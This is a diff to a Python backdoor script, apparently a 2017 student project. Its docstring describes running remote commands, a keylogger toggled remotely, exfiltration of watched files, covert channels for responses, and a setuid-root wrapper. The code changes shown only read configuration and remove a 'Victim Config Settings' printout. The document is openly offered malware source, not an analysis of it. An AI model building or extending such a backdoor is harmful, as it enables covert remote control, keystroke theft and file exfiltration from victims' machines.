@@ -7,12 +7,21 @@ import ConfigParser
 ''' Uses libpcap via Scapy to listen for packets directly on the NIC for either tcp or udp packets (user-
 ''' specified). Incoming packets are further filtered by source and destination ports and remote IP, as
 ''' specified by the user. After packets make it through the filter, they are checked again to ensure that
-''' the payload of the packet contains a special password, indicating a command from the remote host. 
+''' the payload of the packet contains an encrypted signature, indicating a command from the remote host. 
 ''' Packets that don't contain the password are discarded. Commands received in verified packets are 
 ''' executed in a subprocess and the response from the system is sent back to the remote host.
 ''' 
-''' All communication between the backdoor and client is encrypted using AES encryption, with a key
+''' All control commands from the client to backdoor are encrypted using AES encryption, with a key
 ''' password specified by the user. The key given at the backdoor must match the one given at the client.
+'''
+''' All command responses from the backdoor to client are sent over a covert channel.
+'''
+''' The backdoor also contains a keylogger that can be toggled on or off remotely by the client. Recorded
+''' keystrokes are returned to the client over a covert channel (separate from the response channel) to be
+''' logged.
+'''
+''' File Watches can be added by the client. If a specified file is created or modified, it is exfiltrated,
+''' encrypted, to the client over a standard TCP connection.
 '''
 ''' To run:
 '''     The program can optionally be run with the help of wrapper.c, which enables setting the userid
@@ -24,15 +33,16 @@ import ConfigParser
 '''         chown root wrapper
 '''         chmod u+s wrapper
 '''     Then:
-'''         ./wrapper bdoor.py -r remotehost -l localhost -s source_pot -d dest_port -p protocol -k key -n proc_name
+'''         ./wrapper bdoor.py
 '''     
 '''     If the program is run without the wrapper:
-'''         ./bdoor.py -r remotehost -l localhost -s source_pot -d dest_port -p protocol -k key -n proc_name
+'''         ./bdoor.py
 '''
 '''
-''' Author:  Wilson Carpenter - A00867197
-''' Version: 1.0
-''' Date: October 23, 2017
+''' Authors:  Wilson Carpenter
+'''           Robert Purdey
+''' Version: 2.0
+''' Date: December 10, 2017
 '''
 """""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
 
@@ -54,16 +64,6 @@ def main():
     dest_port = config.get('Setup', 'dport')
     protocol = config.get('Setup', 'proto')
     encryption_key = config.get('Setup', 'enkey')
-
-
-    print('--------------------------------------Victim Config Settings--------------------------------------')
-    print('Remote host: ' + remote_host)
-    print('Local host: ' + local_host)
-    print('Source port: ' + source_port)
-    print('Destination port: ' + dest_port)
-    print('Protocol: ' + protocol)
-    print('Key: ' + encryption_key)
-    print('--------------------------------------------------------------------------------------------------')
 
     # initial watches
     watches = config.get('Watches', 'paths').split(',')
